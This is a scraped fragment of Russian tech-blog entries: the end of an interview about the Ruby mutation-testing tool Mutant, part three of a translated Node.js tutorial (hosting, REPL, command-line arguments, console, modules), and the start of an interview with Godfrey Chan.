DataMapper2.»\n\r\nЭто было 5 или 6 лет назад, с тех пор Mutant прошел через несколько итераций. Все они связаны не с моим желанием писать опенсорс, а с требованиями коммерческих проектов, над которыми я работал. Так что развитие Mutant сильно зависит от моей консалтинговой деятельности.\n\r\nКаждый раз, когда я начинаю новый Ruby проект, я мне необходимо быть уверенным в каждом фрагменте кода. И Mutant — это тот инструмент, который я использую для этого.\n\nТо есть коммерческие клиенты хотят использовать Mutant?\n\r\nДа. Это подтверждается тем, что все фичи, которые вы видите — это фичи, которые коммерческие клиенты просили меня добавить в последние годы. Есть некоторые функции, которых нет в публичной версии, потому что клиент не дал мне право открыть их исходный код. Но иногда клиент говорит: «Нет проблем, если кто-то получит пользу от этого», что мне очень нравится.\n\r\nНа данный момент я покинул DataMapper2. Никогда не писал фичи просто для удовольствия. Это просто побочные эффекты коммерческого использования.\n\r\nЯ лично не влюблен в Ruby, это просто инструмент для меня. Mutant — это способ сделать Ruby более эффективным. Порог входа в Mutant очень высок, но когда начнешь — он сильно помогает. Необходимость обучения — это то, с чем нужно смириться.\n\nЭто в порядке вещей, когда используешь бесплатный гем :)\n\r\n95% бесплатных гемов — просто хобби-проекты. Они не подходят для коммерческого использования. Авторы делают их из личных интересов. Я не виню их. Но советую командам разработчиков коммерческих проектов помнить об этом, когда они берут что-то из RubyGems.\n\nЯ прочитал только файл README Mutant’a на GitHub. Но пока мало что понял.\n\r\nИменно по этой причине мне нужно потратить еще какое-то время на написание readme и дополнительной документации начального уровня.\n\r\nПо личным причинам я молчал в коммьюнити 3 года: у меня появилось еще двое детей, я переехал в другую страну.\r\nRubyRussia — это первая конференция после перерыва, когда я смогу поговорить c сообществом. И я хочу использовать время, которое я трачу на подготовку своего доклада и воркшопа, как источник материалов для дополнительной документации.\n\nЧто нас ждет?\n\r\n6 октября будет доклад о Mutant, а 7 октября — workshop. Он будет основан на реальных примерах, взятых из проекта с открытым исходным кодом, который использует rails и rspec.\n\nНасколько я понимаю, ты используешь другой язык программирования, не Ruby?\n\r\nЭто не совсем правда. Я часто использую Ruby, но только если для этого есть веская причина. Обычно это спасение legacy приложений, которые вот-вот рухнут под весом собственного кода.\n\r\nВ таком варианте нельзя просто прийти и за один шаг заменить Ruby. Делать инкрементный рефакторинг / «душить» Ruby-код — моя основная работа. И во время этого процесса руки у меня по локоть в Ruby, и здесь Mutant является моим главным инструментом для связки циклов рефакторинга / изменения.\n\nКакие языки ты предпочитаешь?\n\r\nВ основном Haskell. Сейчас для меня это самый сбалансированный язык по удобству использования и пригодности для разработкой программ, имеющих коммерческую ценность. Haskell Type Checker гарантирует многие свойства сразу же; свойства, за которые в Ruby мне пришлось бы воевать.\n\r\nНа горизонте есть еще несколько других крутых языков и расширений. Я думаю, что зависимые типы перенесут «корректность после прохождения проверки типов» на новый уровень.\n\nСчитаешь ли ты, что у Ruby и Rails есть будущее?\n\r\nУ Ruby и Rails низкий порог вхождения, это помогает людям быстро достичь точки, когда приложение приносит деньги. Пока люди считают, что у Ruby и Rails есть это качество — у этих технологий есть будущее.\n\r\nНебольшое еретическое заявление: Rails-приложения не могут расти из-за унаследованной от фреймворка сложности, из-за выборов, которые сделали создатели языка и фреймворка. Но этот технический долг — ОК, если у вас есть бизнес-причина делать так. Просто имейте готовый план возврата этого долга.\n\nЧто ты думаешь о Rust?\n\r\nМне он действительно нравится. Сейчас я не использую его часто — не было веской причины, так как рабочие проекты не могли ничего получить от преимуществ Rust по сравнению с другими вариантами, которые у меня были.\n\r\nВ основном я занимаюсь backend разработкой. Или назовем это «массовым RPC с предметной логикой». Здесь в первую очередь важно гарантировать корректность программы, а лишь во вторую — её производительность. Rust вычислительно очень эффективен, но за это он требует ручного управления низкоуровневыми деталями. Это занимает время, которое лучше потратить на оптимизацию высокоуровневых паттернов ввода-вывода (группировка RPC, минимизация round trips, верификацию транзакционных свойств и т.д.). Лучше сделать это до того, как оптимизировать отдельные примитивы за счет языка, которые дает мне больше возможностей для оптимизации.\n\r\nЕсли бы я занимался чем-то более вычислительно тяжелым, видеокодеком например, Rust был бы инструментом, который я выбрал.\n\nИ последний вопрос. Что ты можешь посоветовать программистам-новичкам?\n\r\nКак начинающий программист, найдите пет-проект и интегрируйте его с интересами вне программирования. Это необходимо, чтобы быть увлеченным достаточно долго, пока изучение программирования не начнет приносить деньги.\n\nОчень интересно! Это должно сработать!\n\r\nДа, именно так я и начал :)\n\nОтличный совет! Спасибо за интервью! Увидимся на Ruby Russia.\n\r\nВас тоже ждем на конференции! Кстати, осталось меньше 30 билетов, так что не советуем откладывать регистрацию, если решили идти. А если хочется погрузиться в Mutant более основательно, то ждем на воркшопе Маркуса 7 октября. Все подробности на сайте.\n\r\nПрочитать оригинал на английском можно на hype.codes.\n\r\nА тут место для благодарности отличным компаниям, которые подерживают главное Ruby-событие в России:\n\r\nГенеральный партнер — Toptal\r\nЗолотые партнеры — Gett и Cookpad\r\nСеребярные партнеры — Instamart, UCHi.ru, JetBrains и Qlean\r\nБронзовые партнеры — Bookmate и InSales", {"day": "28", "month": "сентября", "time": "10:37"}, {"rate": 5, "views": 789}], ["Перед вами третья часть перевода руководства по Node.js. Сегодня мы поговорим о выборе хостинга для Node.js-проектов, о том, как работать с Node.js в режиме REPL и как запускать скрипты с аргументами, о взаимодействии с консолью и о модулях.\n\n\n\n[Советуем почитать] Другие части циклаЧасть 1: Общие сведения и начало работы\r\nЧасть 2: JavaScript, V8, некоторые приёмы разработки\r\nЧасть 3: Хостинг, REPL, работа с консолью, модули\r\nЧасть 4: npm, файлы package.json и package-lock.json\r\nЧасть 5: npm и npx\r\nЧасть 6: цикл событий, стек вызовов, таймеры\r\nЧасть 7: асинхронное программирование\r\nЧасть 8: Руководство по Node.js, часть 8: протоколы HTTP и WebSocket\r\nЧасть 9: Руководство по Node.js, часть 9: работа с файловой системой\r\nЧасть 10: Руководство по Node.js, часть 10: стандартные модули, потоки, базы данных, NODE_ENV\nПолная PDF-версия руководства по Node.js\n\nХостинг для Node.js-приложений\r\nВыбор хостинга для Node.js-приложений зависит от ваших потребностей. Вот небольшой список вариантов хостинга, который вы можете изучить, приняв решение развернуть своё приложение и сделать его общедоступным. Сначала рассмотрим простые варианты, возможности которых ограничены, а потом — более сложные, но и обладающие более серьёзными возможностями.\n\n▍Самый простой вариант хостинга: локальный туннель\r\nДаже если вашему компьютеру назначен динамический IP-адрес или вы находитесь за NAT, вы можете развернуть на нём своё приложение и обслуживать запросы пользователей к нему, используя локальный туннель.\n\r\nЭтот вариант подходит для быстрой организации тестирования, для того, чтобы устроить демонстрацию продукта, или для того, чтобы дать доступ к приложению очень маленькой группе людей.\n\r\nДля организации локальных туннелей есть очень хороший сервис, ngrok, доступный для множества платформ.\n\r\nИспользуя ngrok, достаточно выполнить команду вида ngrok PORT и указанный вами порт будет доступен из интернета. У вас при этом, если вы пользуетесь бесплатной версией сервиса, будет адрес в домене ngrok.io. Если же вы решите оформить платную подписку, вы сможете использовать собственные доменные имена, и, кроме того, сможете повысить безопасность решения (пользуясь ngrok, вы открываете доступ к своему компьютеру всему интернету).\n\r\nЕщё один инструмент, который можно использовать для организации локальных туннелей, называется localtunnel.\n\n▍Среды для развёртывания Node.js-проектов, не требующие настройки\nGlitch\nGlitch — это интерактивная среда и платформа для быстрой разработки приложений, которая позволяет разворачивать их в поддоменах glitch.com. Собственные домены пользователей эта платформа пока не поддерживает, при работе с ней существуют некоторые ограничения, но она отлично подходит для работы над прототипами приложений. Дизайн Glitch выглядит довольно забавно (пожалуй, это можно записать в плюсы данной платформы), но это не некая «игрушечная», ограниченная донельзя среда. Здесь к вашим услугам возможность работы с Node.js, CDN, защищённое хранилище для конфиденциальной информации, возможности обмена данными с GitHub и многое другое.\n\r\nПроектом Glitch занимается та же компания, которая стоит за FogBugz и Trello (она же является одним из создателей StackOverflow). Я часто использую эту платформу для демонстрации приложений.\n\nCodepen\nCodepen — это замечательная платформа, вокруг которой сформировалось интересное сообщество. Здесь можно создавать проекты, включающие в себя множество файлов, и разворачивать их с использованием собственного домена.\n\n▍Бессерверные среды\r\nБессерверные платформы позволяют публиковать приложения и при этом совершенно не думать о серверах, об их настройке или об управлении ими. Парадигма бессерверных вычислений заключается в том, что приложения публикуют в виде функций, которые реагируют на обращения к сетевой конечной точке. Подобный подход к развёртыванию приложений ещё называют FAAS (Functions As A Service, функция как услуга).\n\r\nВот пара популярных решений в этой области:\n\n\nФреймворк Serverless.\nБиблиотека Standard.\n\r\nОба эти проекта предоставляют разработчику некий уровень абстракции, позволяющий публиковать приложения на различных FAAS-платформах, например, на Amazon AWS Lambda, на Microsoft Azure и на Google Cloud.\n\n▍PAAS-решения\r\nPAAS (Platform As A Service, платформа как услуга) — это платформы, которые берут на себя заботу обо многих вещах, о которых, в обычных условиях, должен заботиться разработчик, развёртывающий приложение.\n\nZeit Now\nZeit — это интересный вариант для развёртывания приложений. Развёртывание, при использовании этой платформы, сводится к вводу в терминале команды now. Существует бесплатная версия Zeit, при работе с ней действуют некоторые ограничения. Есть и платная, более мощная версия этой платформы. Пользуясь Zeit, вы можете попросту не думать о том, что для работы вашего приложения нужен сервер. Вы просто разворачиваете приложение, а всё остальное находится в ведении этой платформы.\n\nNanobox\r\nСоздатели платформы Nanobox, в возможности которой входит развёртывание Node.js-приложений, называют её PAAS V2.\n\nHeroku\nHeroku — это ещё одна замечательная платформа для размещения Node.js-приложений. Вот хорошая статья о том, как с ней работать.\n\nMicrosoft Azure\nAzure — это облачная платформа от Microsoft. В её документации есть раздел, посвящённый Node.js-приложениям.\n\nПлатформа Google Cloud\nGoogle Cloud представляет собой замечательную среду для развёртывания Node.js-приложений. Вот соответствующий раздел её документации.\n\n▍VPS-хостинг\r\nСуществует множество платформ, предоставляющих услуги VPS-хостинга. Общей чертой таких платформ является тот факт, что разработчик получает в своё распоряжение виртуальный сервер, самостоятельно устанавливает на него операционную систему (Linux или Windows), самостоятельно развёртывает приложения.\n\r\nСреди платформ, предоставляющих VPS-услуги, которых существует великое множество, можно отметить следующие, которыми я пользовался и которые мог бы порекомендовать другим:\n\n\nDigital Ocean\nLinode\nAmazon Web Services (в частности, хотелось бы отметить сервис AWS Elastic Beanstalk, облегчающий развёртывание приложений и управление ресурсами AWS).\n\nОт себя добавим, что компания RUVDS тоже оказывает услуги VPS-хостинга. Мы лицензированы ФСТЭК, наши клиенты застрахованы AIG, у нас есть четыре дата-центра в разных странах. Есть собственный дата-центр RUCLOUD уровня TIER 3 в г. Королеве, Московская область, а также гермозоны в дата-центрах Deltalis (Швейцария), Лондоне Equinix LD8 (Великобритания), и ММТС-9 (Москва, Россия). Все гермозоны отвечают уровню надежности не ниже TIER 3.\n\r\nПартнерами компании являются АО «ФИНАМ», финансовая группа «БКС», Национальный расчетный депозитарий (Московская биржа), АО «ВЦИОМ», компания «Гарс-Телеком», оператор такси Gett, оператор доставки Delivery Club и многие другие.\n\n\n▍Обычный сервер\r\nЕщё одно решение в области хостинга представляет собой покупку (или аренду, например, с помощью службы Vultr Bare Metal) обычного сервера, установку на него Linux и другого ПО, подключение его к интернету и размещение на нём Node.js-приложений.\n\r\nХостинг — тема огромная, но, надеемся, материалы этого раздела позволят вам выбрать именно то, что вам нужно. Теперь переходим к рассказу о работе с Node.js в режиме REPL.\n\nИспользование Node.js в режиме REPL\r\nАббревиатура REPL расшифровывается как Read-Evaluate-Print-Loop (цикл «чтение — вычисление — вывод»). Использование REPL — это отличный способ быстрого исследования возможностей Node.js.\n\r\nКак вы уже знаете, для запуска скриптов в Node.js используется команда node, выглядит это так:\n\nnode script.js\r\nЕсли ввести такую же команду, но не указывать имя файла, Node.js будет запущен в режиме REPL:\n\nnode\r\nЕсли вы попробуете сейчас ввести такую команду в своём терминале, то в результате увидите примерно следующее:\n\n> node\n>\r\nNode.js теперь находится в режиме ожидания. Система ждёт, что мы введём в командной строке какой-нибудь JavaScript-код, который она будет выполнять.\n\r\nДля начала попробуем что-нибудь очень простое:\n\n> console.log('test')\ntest\nundefined\n>\r\nТут мы предложили Node.js выполнить команду, используемую для вывода данных в консоль. Первое значение, test, представляет собой то, что вывела команда console.log('test'). Второе значение, undefined, это то, что возвратила функция console.log().\n\r\nПосле завершения выполнения команды появляется приглашение REPL, это означает, что мы можем ввести здесь новую команду.\n\n▍Автозавершение команд с помощью клавиши Tab\r\nREPL — это интерактивная среда. Если в процессе написания кода нажать клавишу Tab на клавиатуре, REPL попытается автоматически завершить ввод, подобрав, например, подходящее имя уже объявленной вами переменной или имя некоего стандартного объекта.\n\n▍Исследование объектов JavaScript\r\nВведите в командную строку имя какого-нибудь стандартного объекта JavaScript, например — Number, добавьте после него точку и нажмите клавишу Tab.\n\r\nREPL выведет список свойств и методов объекта, с которыми может взаимодействовать разработчик:\n\n\nИсследование объекта Number\n\n▍Исследование глобальных объектов\r\nДля того чтобы узнать, с какими глобальными объектам Node.js вы можете работать, введите в терминале команду global. и нажмите Tab.\n\n\nИсследование глобальных объектов\n\n▍Специальная переменная _\r\nПеременная _ (знак подчёркивания) хранит результат последней выполненной операции. Эту переменную можно использовать в составе команд, вводимых в консоль.\n\n▍Команды, начинающиеся с точки\r\nВ режиме REPL можно пользоваться некоторыми специальными командами, которые начинаются с точки. Вот они:\n\n\nКоманда .help выводит справочные сведения по командам, начинающимся с точки.\nКоманда .editor переводит систему в режим редактора, что упрощает ввод многострочного JavaScript-кода. После того, как находясь в этом режиме, вы введёте всё, что хотели, для запуска кода воспользуйтесь командой Ctrl+D.\nКоманда .break позволяет прервать ввод многострочного выражения. Её использование аналогично применению сочетания клавиш Ctrl+C.\nКоманда .clear очищает контекст REPL, а так же прерывает ввод многострочного выражения.\nКоманда .load загружает в текущий сеанс код из JavaScript-файла.\nКоманда .save сохраняет в файл всё, что было введено во время REPL-сеанса.\nКоманда .exit позволяет выйти из сеанса REPL, она действует так же, как два последовательных нажатия сочетания клавиш Ctrl+C.\n\r\nНадо отметить, что REPL распознаёт ввод многострочных выражений и без использования команды .editor.\n\r\nНапример, мы начали вводить код итератора:\n\n[1, 2, 3].forEach(num => {\r\nЕсли, после ввода фигурной скобки, нажать на клавишу Enter, REPL перейдёт на новую строку, приглашение в которой будет выглядеть как три точки. Это указывает на то, что мы можем вводить код соответствующего блока. Выглядит это так:\n\n... console.log(num)\n... })\r\nНажатие на Enter после ввода последней скобки приведёт к выполнению выражения. Если ввести в этом режиме .break, ввод будет прерван и выражение выполнено не будет.\n\r\nРежим REPL — полезная возможность Node.js, но область её применения ограничена небольшими экспериментами. Нас же интересует нечто большее, чем возможность выполнить пару команд. Поэтому переходим к работе с Node.js в обычном режиме. А именно, поговорим о том, как Node.js-скрипты могут принимать аргументы командной строки.\n\nРабота с аргументами командной строки в Node.js-скриптах\r\nПри запуске Node.js-скриптов им можно передавать аргументы. Вот обычный вызов скрипта:\n\nnode app.js\r\nПередаваемые скрипту аргументы могут представлять собой как самостоятельные значения, так и конструкции вида ключ-значение. В первом случае запуск скрипта выглядит так:\n\nnode app.js flavio\r\nВо втором — так:\n\nnode app.js name=flavio\r\nОт того, какой именно способ передачи аргументов используется, зависит то, как с ними можно будет работать в коде скрипта.\n\r\nТак, для того, чтобы получить доступ к аргументам командной строки, используется стандартный объект Node.js process. У него есть свойство argv, которое представляет собой массив, содержащий, кроме прочего, аргументы, переданные скрипту при запуске.\n\r\nПервый элемент массива argv содержит полный путь к файлу, который выполняется при вводе команды node в командной строке.\n\r\nВторой элемент — это путь к выполняемому файлу скрипта.\n\r\nВсе остальные элементы массива, начиная с третьего, содержат то, что было передано скрипту при его запуске.\n\r\nПеребор аргументов, имеющихся в argv (сюда входят и путь к node, и путь к выполняемому файлу скрипта), можно организовать с использованием цикла forEach:\n\nprocess.argv.forEach((val, index) => {\n  console.log(`${index}: ${val}`)\n})\r\nЕсли два первых аргумента вас не интересуют, на основе argv можно сформировать новый массив, в который войдёт всё из argv кроме первых двух элементов:\n\nconst args = process.argv.slice(2)\r\nПредположим, при запуске скрипта, ему передали лишь один аргумент, в виде самостоятельного значения:\n\nnode app.js flavio\r\nОбратиться к этому аргументу можно так:\n\nconst args = process.argv.slice(2)\nargs[0]\r\nТеперь попробуем воспользоваться конструкцией вида ключ-значение:\n\nnode app.js name=flavio\r\nПри таком подходе, после формирования массива args, в args[0] окажется строка name=flavio. Прежде чем пользоваться аргументом, эту строку надо разобрать. Самый удобный способ это сделать заключается в использовании библиотеки minimist, которая предназначена для облегчения работы с аргументами командной строки:\n\nconst args = require('minimist')(process.argv.slice(2))\nargs['name'] //flavio\r\nТеперь рассмотрим вывод данных в консоль.\n\nВывод данных в консоль с использованием модуля console\r\nСтандартный модуль Node.js console даёт разработчику массу возможностей по взаимодействию с командной строкой во время выполнения программы. В целом, это — то же самое, что объект console, используемый в браузерном JavaScript. Пожалуй, самый простой и самый широко используемый метод модуля console — это console.log(), который применяется для вывода передаваемых ему строковых данных в консоль. При этом, если передать ему объект, то он, перед выводом, будет преобразован к своему строковому представлению.\n\r\nМетоду console.log() можно передавать несколько значений:\n\nconst x = 'x'\nconst y = 'y'\nconsole.log(x, y)\r\nПосле выполнения этой последовательности инструкций в консоль попадёт и значение x, и значение y.\n\r\nДля формирования сложных строк команда console.log() поддерживает использование подстановочных символов, которые, при выводе данных, заменяются на соответствующие им значения в порядке очерёдности.\n\r\nНапример, вот команда, которая выводит текст My cat has 2 years:\n\nconsole.log('My %s has %d years', 'cat', 2)\r\nРассмотрим особенности подстановочных символов:\n\n\n%s форматирует значение в виде строки.\n%d или %i форматируют значение в виде целого числа.\n%f форматирует значение в виде числа с плавающей точкой.\n%O используется для вывода строковых представлений объектов.\n\r\nВот ещё один пример использования подстановочных символов:\n\nconsole.log('%O', Number)\n▍Очистка консоли\r\nДля очистки консоли используется команда console.clear() (её поведение в разных терминалах может различаться).\n\n▍Подсчёт элементов\r\nСейчас мы рассмотрим полезный метод console.count(). Взгляните на этот код:\n\nconst x = 1\nconst y = 2\nconst z = 3\nconsole.count(\n  'The value of x is ' + x + ' and has been checked .. how many times?'\n)\nconsole.count(\n  'The value of x is ' + x + ' and has been checked .. how many times?'\n)\nconsole.count(\n  'The value of y is ' + y + ' and has been checked .. how many times?'\n)\r\nМетод count() подсчитывает количество выводов строк и выводит результат рядом с ними.\r\nИспользуя этот метод можно, в следующем примере, посчитать яблоки и апельсины:\n\nconst oranges = ['orange', 'orange']\nconst apples = ['just one apple']\noranges.forEach(fruit => {\n  console.count(fruit)\n})\napples.forEach(fruit => {\n  console.count(fruit)\n})\n▍Вывод в консоль результатов трассировки стека\r\nИногда бывает полезно вывести в консоль трассировку стека функции. Например, для того, чтобы ответить на вопрос о том, как мы попали в некое место программы. Сделать это можно с помощью такой команды:\n\nconsole.trace()\r\nВот пример её использования:\n\nconst function2 = () => console.trace()\nconst function1 = () => function2()\nfunction1()\r\nВот что произошло, когда я запустил этот код в режиме REPL:\n\nTrace\n    at function2 (repl:1:33)\n    at function1 (repl:1:25)\n    at repl:1:1\n    at ContextifyScript.Script.runInThisContext (vm.js:44:33)\n    at REPLServer.defaultEval (repl.js:239:29)\n    at bound (domain.js:301:14)\n    at REPLServer.runBound [as eval] (domain.js:314:12)\n    at REPLServer.onLine (repl.js:440:10)\n    at emitOne (events.js:120:20)\n    at REPLServer.emit (events.js:210:7)\n▍Измерение времени, затраченного на выполнение некоего действия\r\nИзмерить время, которое занимает, например, выполнение некоей функции, можно с использованием методов console.time() и console.timeEnd(). Выглядит это так:\n\nconst doSomething = () => console.log('test')\nconst measureDoingSomething = () => {\n  console.time('doSomething()')\n  //вызываем функцию и замеряем время, необходимое на её выполнение\n  doSomething()\n  console.timeEnd('doSomething()')\n}\nmeasureDoingSomething()\n▍Работа с stdout и stderr\r\nКак мы уже видели, команда console.log() отлично подходит для вывода сообщений в консоль. При её применении используется так называемый стандартный поток вывода, или stdout.\n\r\nКоманда console.error() выводит данные в стандартный поток ошибок, stderr. Данные, отправляемые в stderr, попадают в консоль, хотя то, что выводится в этот поток, можно, например, перенаправить в файл журнала ошибок.\n\n▍Использование цвета при выводе данных в консоль\r\nДля того чтобы раскрасить выводимые в консоль тексты, можно воспользоваться escape-последовательностями, идентифицирующими цвета:\n\nconsole.log('\\x1b[33m%s\\x1b[0m', 'hi!')\r\nЕсли выполнить эту команду, например, в режиме REPL, текст hi будет выведен жёлтым цветом.\r\nТакой подход, однако, не особенно удобен. Для вывода в консоль цветных надписей удобно будет воспользоваться специализированной библиотекой, например — chalk. Эта библиотека, помимо цветового форматирования текстов, поддерживает и другие способы их стилизации. Например, с её помощью можно оформить текст полужирным, курсивным или подчёркнутым шрифтом.\n\r\nДля её установки из npm воспользуйтесь такой командой:\n\nnpm install chalk\r\nПользоваться ей можно так:\n\nconst chalk = require('chalk')\nconsole.log(chalk.yellow('hi!'))\r\nПользоваться командой chalk.yellow() гораздо удобнее, чем escape-последовательностями, да и текст программы при таком подходе читать гораздо легче.\n\r\nДля того чтобы узнать подробности о chalk, посмотрите страницу этой библиотеки на GitHub.\n\n▍Создание индикатора выполнения операции\r\nИндикатор выполнения операции (progress bar) может пригодиться в разных ситуациях. Для создания индикаторов выполнения, работающих в консоли, можно воспользоваться пакетом progress. Установить его можно так:\n\nnpm install progress\r\nНиже показан пример кода, в котором создаётся индикатор, который можно использоваться для вывода сведений о некоей задаче, состоящей из 10 шагов. В нашем случае на выполнение каждого шага уходит 100 мс. После того, как индикатор заполнится, вызывается команда clearItnerval() и выполнение программы завершается.\n\nconst ProgressBar = require('progress')\nconst bar = new ProgressBar(':bar', { total: 10 })\nconst timer = setInterval(() => {\n  bar.tick()\n  if (bar.complete) {\n    clearInterval(timer)\n  }\n}, 100)\n▍Приём пользовательского ввода из командной строки\r\nКак сделать приложения командной строки, написанные для платформы Node.js, интерактивными? Начиная с 7 версии Node.js содержит модуль readline, который позволяет принимать данные из потоков, которые можно читать, например, из process.stdin. Этот поток, во время выполнения Node.js-программы, представляет собой то, что вводят в терминале. Данные вводятся по одной строке за раз.\n\r\nРассмотрим следующий фрагмент кода:\n\nconst readline = require('readline').createInterface({\n  input: process.stdin,\n  output: process.stdout\n})\nreadline.question(`What's your name?`, (name) => {\n  console.log(`Hi ${name}!`)\n  readline.close()\n})\r\nЗдесь мы спрашиваем у пользователя его имя, а после ввода текста и нажатия на клавишу Enter на клавиатуре, выводим приветствие.\n\r\nМетод question() выводит то, что передано ему в качестве первого параметра (то есть — вопрос, задаваемый пользователю) и ожидает завершения ввода. После нажатия на Enter он вызывает коллбэк, переданный ему во втором параметре и обрабатывает то, что было введено. В этом же коллбэке мы закрываем интерфейс readline.\n\r\nМодуль readline поддерживает и другие методы, подробности о них вы можете узнать в документации, ссылка на которую приведена выше.\n\r\nЕсли вам, с использованием этого механизма, надо запросить у пользователя пароль, то лучше не выводить его, в ходе ввода, на экран, а показывать вместо введённых символов символ звёздочки — *.\n\r\nДля того чтобы это сделать, можно воспользоваться пакетом readline-sync, устройство которого похоже на то, как устроен модуль readline, и который поддерживает подобные возможности сразу после установки.\n\r\nЕсть и ещё один пакет, предоставляющий более полное и абстрактное решение подобной проблемы. Это пакет inquirer. Установить его можно так:\n\nnpm install inquirer\r\nС его использованием вышеприведённый пример можно переписать следующим образом:\n\nconst inquirer = require('inquirer')\nvar questions = [{\n  type: 'input',\n  name: 'name',\n  message: \"What's your name?\",\n}]\ninquirer.prompt(questions).then(answers => {\n  console.log(`Hi ${answers['name']}!`)\n})\r\nПакет inquirer обладает обширными возможностями. Например, он может помочь задать пользователю вопрос с несколькими вариантами ответа или сформировать в консоли интерфейс с радиокнопками.\n\r\nПрограммисту стоит знать о наличии альтернативных возможностей по выполнению неких действий в Node.js. В нашем случае это стандартный модуль readline, пакеты readline-sync и inquirer. Выбор конкретного решения зависит от целей проекта, от наличия времени на реализацию тех или иных возможностей и от сложности пользовательского интерфейса, который планируется сформировать средствами командной строки.\n\nСистема модулей Node.js, использование команды exports\r\nПоговорим о том, как использовать API module.exports для того, чтобы открывать доступ к возможностям модулей другим файлам приложения. В Node.js имеется встроенная система модулей, каждый файл при этом считается самостоятельным модулем. Общедоступный функционал модуля, с помощью команды require, могут использовать другие модули:\n\nconst library = require('./library')\r\nЗдесь показан импорт модуля library.js, файл которого расположен в той же папке, в которой находится файл, импортирующий его.\n\r\nМодуль, прежде чем будет смысл его импортировать, должен что-то экспортировать, сделать общедоступным. Ко всему, что явным образом не экспортируется модулем, нет доступа извне. Собственно говоря, API module.exports позволяет организовать экспорт того, что будет доступно внешним по отношению к модулю механизмам.\n\r\nЭкспорт можно организовать двумя способами.\n\r\nПервый заключается в записи объекта в module.exports, который является стандартным объектом, предоставляемым системой модулей. Это приводит к экспорту только соответствующего объекта:\n\nconst car = {\n  brand: 'Ford',\n  model: 'Fiesta'\n}\nmodule.exports = car\n//..в другом файле\nconst car = require('./car')\r\nВторой способ заключается в том, что экспортируемый объект записывают в свойство объекта exports. Такой подход позволяет экспортировать из модуля несколько объектов, и, в том числе — функций:\n\nconst car = {\n  brand: 'Ford',\n  model: 'Fiesta'\n}\nexports.car = car\r\nТо же самое можно переписать и короче:\n\nexports.car = {\n  brand: 'Ford',\n  model: 'Fiesta'\n}\r\nВ другом файле воспользоваться тем, что экспортировал модуль, можно так:\n\nconst items = require('./items')\nitems.car\r\nИли так:\n\nconst car = require('./items').car\r\nВ чём разница между записью объекта в module.exports и заданием свойств объекта exports?\n\r\nВ первом экспортируется объект, который записан в module.exports. Во втором случае экспортируются свойства этого объекта.\n\nИтоги\r\nСегодня мы поговорили о хостингах для Node.js-приложений, о REPL, о работе с командной строкой, о системе модулей Node.js. В следующий раз мы начнём обстоятельный разговор об npm, и, в частности, рассмотрим особенности файлов package.json и package-lock.json.\n\nУважаемые читатели! Какие хостинги вы используете для своих Node.js-приложений?", {"day": "19", "month": "сентября", "time": "12:00"}, {"rate": 26, "views": 65000}], ["Всем привет! 6 октября в Москве пройдет конференция RubyRussia — cтарый добрый RailsClub, но с новым именем. Спикеры этого года: Aaron Patterson, Charles Nutter, Godfrey Chan, Maciej Mensfeld, Markus Schirp и не только. Ну и конечно, 600 участников, лучшие компании со стендами в холле и огненное афтепати.\n\r\nТрадиционно, перед конференцией мы разговариваем о самых актуальных темах в Ruby и Rails. Сегодня знакомим вас с Godfrey Chan — ex-Rails core team, работает в Tilde, где разрывается между созданием умного Rails-профайлера Skylight, работой над Ember.js и развитием JavaScript на TC39. Тим-лид из Evrone Дмитрий Матвеев задал нашему гостю важные вопросы.\n\n\n\n\nДавай начнем с пары вопросов о твоем докладе на RubyRussia?\n\r\nНе хочу раскрывать все секреты! Мой доклад называется «Dropping down to the metal». Расскажу о том, как с помощью метапрограммирования написать довольно странный код на Rubу, чтобы сделать что-то похожее на JavaScript. Конечно, мы не сможем написать полноценный парсер JavaScript и исполнительную среду, но я покажу кое-какую магию, которая заставит кусок JavaScript-подобного кода выполняться в Ruby используя нативный Ruby runtime. Это весело, по крайней мере, мне очень нравится. Это та же техника, с помощью которой можно написать вещи типа rspec, rake или других DSL на Ruby. Покажу слушателям, как Ruby парсит и запускает ваш код, и какие хуки можно использовать. Думаю, что доклад будет не только веселым, но и научит некоторым полезным вещам о метапрограммировании в Ruby.\n\nКруто! То есть будут и практические советы, верно?\n\r\nНе уверен, что удастся сделать на них акцент, но верю, что из этих 30 минут вы вынесете что-то полезное для себя.\n\nОтлично! Думаю, доклад будет интересен как для опытных программистов, так и для новичков. Правда?\n\r\nНадеюсь, что так и будет. По крайней мере, я постараюсь.\n\nКстати, вчера прочитал твою статью на Medium о переосмыслении образования в computer science. Статья очень интересная, и я согласен с мыслями о различиях между классическим университетским образованием и современными курсами для программистов. К слову, а почему ты сам решил стать программистом?\n\r\nПросто счастливая случайность, никогда не планировал работать программистом, для меня это было чем-то вроде хобби. Мне очень нравилось возиться с компами, там легко было придумать себе занятие — случайно удалить системные файлы или поковыряться в реестре Windows. Потом мне захотелось чего-то большего. После школы я начал ходить на курсы по созданию веб-сайтов. Я был в восторге от возможности создавать что-то новое на компьютере. Но вскоре я понял, что и этого мне мало. Я мог создать некое подобие компьютерной игры на HTML, но этот инструментарий был довольно ограничен. Однажды, мой учитель дал мне книгу по PHP. Я прочитал ее всю и, неожиданно для себя, открыл целый новый мир возможностей, который дает гораздо больше, чем HTML и CSS. Это было очень круто, после этого я стал читать все больше книг на эту тему. Следующим языком, который я изучил, стала Java. Однажды я прочитал про Ruby в журнале Linux Magazine (на самом деле не про Ruby, а про Rails, конечно), и подумал, что было бы здорово изучить его. Оттуда все началось, и, как снежный ком, катится по сей день.\n\nИ так ты перешёл на Ruby, да?\n\r\nЯ открыл для себя Ruby примерно в то время, когда начал изучать Computer Science в колледже, так что одновременно я занимался еще и Java, C ++, Haskell и не только, изучал сразу много языков программирования. В рамках учебы у нас не было заданий по Ruby, а мне он очень нравился, так что я всегда старался использовать именно его на тех классах, где можно было выбрать технологию самому. Ну и в своих сторонних проектах тоже. Когда я окончил колледж, я решил искать работу, связанную с Ruby. Это было просто, ведь Rails тогда был на пике популярности: множество стартапов использовало эту технологию. Так интерес стал моей работой.\n\nА сейчас ты используешь Ruby в качестве основного инструмента? Или работаешь с чем-то другим?\n\r\nНа моей нынешней работе в Tilde я не пишу на Ruby так много, как раньше. Я бы сказал, что моя работа — коктейль из JavaScript/TypeScript, Rust, Ruby и иногда Java. Но, так или иначе, вся работа, которую я делаю, связана с Ruby.\n\r\nОсновным продуктом в Tilde является Skylight. Далеко не все компоненты в нем написаны на Ruby: фронтенд — на JavaScript и Ember, бэкэнд на Rails, но вся обработка поступающих данных — это Java и Rust. Но сам по себе Skylight — это инструмент контроля производительности для Rails приложений. В этом смысле вся работа, которую я делаю, по-прежнему связана с Ruby.\n\nСупер! 